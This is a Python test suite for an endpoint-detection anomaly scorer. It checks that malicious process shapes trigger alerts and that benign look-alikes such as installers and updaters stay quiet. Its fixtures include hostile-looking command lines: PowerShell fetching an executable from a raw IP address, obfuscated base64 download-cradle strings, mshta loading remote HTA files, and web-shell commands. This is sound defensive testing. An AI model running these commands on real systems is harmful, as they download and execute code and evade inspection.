#!/usr/bin/env python3
"""Behavioral anomaly scorer tests (valkyrie/behavior_score.py) — the *nose*.

This is the generalizing detector: it must FIRE on intrinsic malicious scent it
was never handed a rule for, and — the harder half — it must STAY QUIET on the
benign shapes that superficially resemble malware (installers from Downloads,
updaters under AppData, LOLBins run legitimately). A false positive here breaks
a real machine, so the benign controls are the point of this file.

  [1] Each intrinsic malicious shape crosses the firing bar
  [2] Every fired case maps to a chain-ready ATT&CK tactic
  [3] Benign look-alikes stay UNDER the bar (the FP boundary)
  [4] It generalizes — fires on shapes no behavioral_rules.py rule matches
  [5] Weak signals compound; a lone weak signal does not fire
  [6] obfuscation_strength / looks_machine_generated unit behavior
  [7] AncestryBaseline lift only tips a near-bar case, after warmup
  [8] Pipeline: a fired scent becomes a detection carrying its technique
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_FAILURES: list[str] = []


def _check(label: str, ok: bool) -> None:
    print(f"  [{'+' if ok else '!'}] {label}: {'PASS' if ok else 'FAIL'}")
    if not ok:
        _FAILURES.append(label)


# (label, image, parent, cmdline, path) — intrinsic malicious scent that must FIRE.
MALICIOUS = [
    ("svchost masquerading from temp", "svchost.exe", "explorer.exe", "svchost.exe",
     r"C:\Users\v\AppData\Local\Temp\svchost.exe"),
    ("lsass name outside system32", "lsass.exe", "cmd.exe", "lsass.exe",
     r"C:\ProgramData\lsass.exe"),
    ("system-name typosquat", "svch0st.exe", "explorer.exe", "svch0st.exe",
     r"C:\Users\v\AppData\Local\Temp\svch0st.exe"),
    ("double-extension lure", "invoice.pdf.exe", "outlook.exe", "invoice.pdf.exe",
     r"C:\Users\v\Downloads\invoice.pdf.exe"),
    ("web server spawns shell (web-shell)", "cmd.exe", "w3wp.exe", "cmd /c whoami", ""),
    ("browser spawns powershell", "powershell.exe", "chrome.exe",
     "powershell -nop -w hidden", ""),
    ("office spawns interpreter", "wscript.exe", "excel.exe", "wscript x.vbs", ""),
    ("interpreter from temp", "powershell.exe", "explorer.exe",
     "powershell -File x.ps1", r"C:\Users\v\AppData\Local\Temp\powershell.exe"),
    ("heavily obfuscated charcode PS", "powershell.exe", "explorer.exe",
     "powershell -nop -w hidden \"$x=[char]105+[char]101+[char]120;"
     "$y=[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("
     "'aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCk='));-join $y\"", ""),
    ("caret-escaped cmd obfuscation", "cmd.exe", "explorer.exe",
     "c^m^d /c p^o^w^e^r^s^h^e^l^l -e^n^c aaaa^bbbb^cccc^dddd^eeee^ffff", ""),
    ("interpreter from temp fetching a URL", "powershell.exe", "explorer.exe",
     "powershell -c \"iwr http://45.9.148.99/a -OutFile a.exe\"",
     r"C:\Users\v\AppData\Local\Temp\powershell.exe"),
    ("mshta remote over UNC", "mshta.exe", "explorer.exe",
     "mshta \\\\10.0.0.5\\share\\x.hta", ""),
    # Impossible parent→child ancestry — masquerade / injection detected with a
    # totally benign-looking command line and even the CORRECT image path, so no
    # rule and no path/name signal can catch it; only the ancestry check does.
    ("fake svchost — wrong parent (masquerade/injection)", "svchost.exe", "cmd.exe",
     "svchost.exe -k netsvcs", r"C:\Windows\System32\svchost.exe"),
    ("lsass spawns a shell (credential-theft injection)", "cmd.exe", "lsass.exe",
     "cmd /c whoami", r"C:\Windows\System32\cmd.exe"),
    ("winlogon spawns cmd (accessibility-feature RCE)", "cmd.exe", "winlogon.exe",
     "cmd.exe", r"C:\Windows\System32\cmd.exe"),
]

# Benign shapes that MUST NOT fire — the false-positive boundary. These are the
# cases a naive "temp = bad / lolbin = bad" detector wrongly flags.
BENIGN = [
    ("chrome from Program Files", "chrome.exe", "explorer.exe",
     "chrome.exe --profile-directory=Default",
     r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    ("real svchost from system32", "svchost.exe", "services.exe",
     "svchost.exe -k netsvcs", r"C:\Windows\System32\svchost.exe"),
    ("real lsass from wininit", "lsass.exe", "wininit.exe",
     "lsass.exe", r"C:\Windows\System32\lsass.exe"),
    ("real services from wininit", "services.exe", "wininit.exe",
     "services.exe", r"C:\Windows\System32\services.exe"),
    ("msbuild under devenv (lolbin, benign)", "msbuild.exe", "devenv.exe",
     "msbuild project.sln /p:Configuration=Release",
     r"C:\Program Files\Microsoft Visual Studio\MSBuild\Current\Bin\msbuild.exe"),
    ("certutil hashing (lolbin, no network)", "certutil.exe", "cmd.exe",
     "certutil -hashfile a.exe sha256", r"C:\Windows\System32\certutil.exe"),
    ("installer from Downloads (plain exe)", "AppSetup.exe", "explorer.exe",
     "AppSetup.exe /S", r"C:\Users\v\Downloads\AppSetup.exe"),
    ("updater under AppData\\Local\\<app>", "Update.exe", "services.exe",
     "Update.exe --check", r"C:\Users\v\AppData\Local\Slack\Update.exe"),
    ("normal admin powershell", "powershell.exe", "explorer.exe",
     "powershell Get-ChildItem C:\\Users -Recurse", ""),
    ("git commit", "git.exe", "cmd.exe",
     "git commit -m \"fix: race in writer\"", r"C:\Program Files\Git\cmd\git.exe"),
    ("node server", "node.exe", "cmd.exe", "node server.js --port 8080",
     r"C:\Program Files\nodejs\node.exe"),
    ("teams update from AppData", "Teams.exe", "explorer.exe", "Teams.exe",
     r"C:\Users\v\AppData\Local\Microsoft\Teams\current\Teams.exe"),
    ("cmd dir listing", "cmd.exe", "explorer.exe", "cmd /c dir C:\\Projects", ""),
    ("legit certutil download over https to CDN name — still fetch shape but "
     "from system path, single weak signal",
     "certutil.exe", "cmd.exe", "certutil -hashfile report.pdf sha1",
     r"C:\Windows\System32\certutil.exe"),
]


def main() -> int:
    from valkyrie.behavior_score import (
        score_process, classify_anomaly, obfuscation_strength,
        looks_machine_generated, AncestryBaseline,
    )
    from valkyrie.behavioral_rules import match_process
    from valkyrie.edr.killchain import tactic_for
    from valkyrie.telemetry import severity_rank, SEV_MEDIUM

    print("\n=== behavioral anomaly scorer (the nose) ===\n")

    print("[1] Intrinsic malicious shapes cross the firing bar")
    for label, image, parent, cmd, path in MALICIOUS:
        r = score_process(image, parent, cmd, path)
        _check(f"FIRES: {label} (score={r.score})", r.fired())

    print("\n[2] Every fired malicious case maps to a chain-ready tactic")
    for label, image, parent, cmd, path in MALICIOUS:
        r = score_process(image, parent, cmd, path)
        # technique may be "" only if it didn't fire; if it fired it must map.
        ok = (not r.fired()) or (r.technique and tactic_for(r.technique) is not None)
        _check(f"tactic-ready: {label}", bool(ok))

    print("\n[3] Benign look-alikes stay UNDER the bar (FP boundary)")
    for label, image, parent, cmd, path in BENIGN:
        r = score_process(image, parent, cmd, path)
        _check(f"quiet: {label} (score={r.score})", not r.fired())

    print("\n[4] Generalization — fires where the RULE engine has no match")
    # These shapes are deliberately NOT in behavioral_rules.py's rule set.
    # Paths chosen OUTSIDE behavioral_rules.py's generic suspicious-path rule
    # (which already flags anything under \temp\ or \downloads\) so these are
    # genuine rule MISSES the nose alone catches.
    generalization = [
        ("browser-spawned PS", "powershell.exe", "chrome.exe",
         "powershell -nop -w hidden", ""),
        ("web-shell", "cmd.exe", "w3wp.exe", "cmd /c whoami", ""),
        ("svchost masquerade (ProgramData)", "svchost.exe", "explorer.exe",
         "svchost.exe", r"C:\ProgramData\svchost.exe"),
        ("double-extension lure (Documents)", "invoice.pdf.exe", "outlook.exe",
         "invoice.pdf.exe", r"C:\Users\v\Documents\invoice.pdf.exe"),
    ]
    for label, image, parent, cmd, path in generalization:
        rule_hits = match_process(image, parent, cmd, path)
        nose = score_process(image, parent, cmd, path)
        _check(f"{label}: rules miss ({len(rule_hits)}), nose fires",
               len(rule_hits) == 0 and nose.fired())

    print("\n[5] Weak signals compound; a lone weak signal does not fire")
    lone = score_process("AppSetup.exe", "explorer.exe", "AppSetup.exe /S",
                         r"C:\Users\v\Downloads\AppSetup.exe")
    _check("plain exe from Downloads alone stays low", not lone.fired())
    combined = score_process("setup.exe", "explorer.exe",
                            "setup.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYw"
                            "Ad2VjbGllbnQ",
                            r"C:\Users\v\Downloads\setup.exe")
    _check("same dir + obfuscated command now fires", combined.fired())

    print("\n[6] obfuscation_strength / looks_machine_generated behavior")
    s_ob, _ = obfuscation_strength(
        "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBldA")
    s_clean, _ = obfuscation_strength("powershell Get-ChildItem -Recurse")
    _check("encoded command scores obfuscated", s_ob >= 0.3)
    _check("ordinary command scores clean", s_clean < 0.3)
    _check("random name detected", looks_machine_generated("x7f9q2zk8w"))
    _check("real word not random", not looks_machine_generated("chromeupdate"))
    _check("short name not random", not looks_machine_generated("setup"))

    print("\n[7] AncestryBaseline lift only after warmup, only when near bar")
    bl = AncestryBaseline(warmup=5)
    _check("cold baseline calls nothing rare", not bl.is_rare("explorer.exe", "x.exe"))
    for _ in range(6):
        bl.observe("explorer.exe", "chrome.exe")
    _check("learned pair is not rare", not bl.is_rare("explorer.exe", "chrome.exe"))
    _check("unseen pair is rare after warmup", bl.is_rare("explorer.exe", "weird.exe"))
    # The lift alone must not push an otherwise-benign process over the bar.
    lifted = score_process("chrome.exe", "explorer.exe", "chrome.exe",
                           r"C:\Program Files\Google\Chrome\chrome.exe", baseline=bl)
    _check("rare-ancestry lift alone does not fire a benign process",
           not lifted.fired())

    print("\n[8] Pipeline — a fired scent becomes a detection with its technique")
    import tempfile
    from valkyrie.store import Store
    from valkyrie.edr import EdrEngine
    with tempfile.TemporaryDirectory() as td:
        store = Store(db_path=Path(td) / "n.db"); store.start()
        engine = EdrEngine(store); engine.start()
        anom = classify_anomaly("svchost.exe", "explorer.exe", "svchost.exe",
                                r"C:\Users\v\AppData\Local\Temp\svchost.exe")
        _check("masquerade classifies as anomaly", anom is not None)
        if anom:
            inc_id = engine.ingest_telemetry({
                "category": "process", "activity": "exec", "action": "flagged",
                "severity": anom["severity"], "labels": anom["labels"],
                "reason": anom["reason"], "actor_name": "svchost.exe",
                "actor_pid": 9, "fields": {"technique": anom["technique"], "ppid": 4}})
            _check("anomaly raised an incident", inc_id is not None)
            if inc_id:
                det = (engine.get_incident(inc_id).get("detections") or [{}])[0]
                _check("detection carries masquerade technique (T1036)",
                       "T1036" in (det.get("technique") or ""))
        engine.stop(); store.stop()

    print("\n" + "=" * 56)
    if _FAILURES:
        print(f"FAILED: {len(_FAILURES)} check(s)")
        for f in _FAILURES:
            print(f"  - {f}")
        return 1
    print("All checks PASSED.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
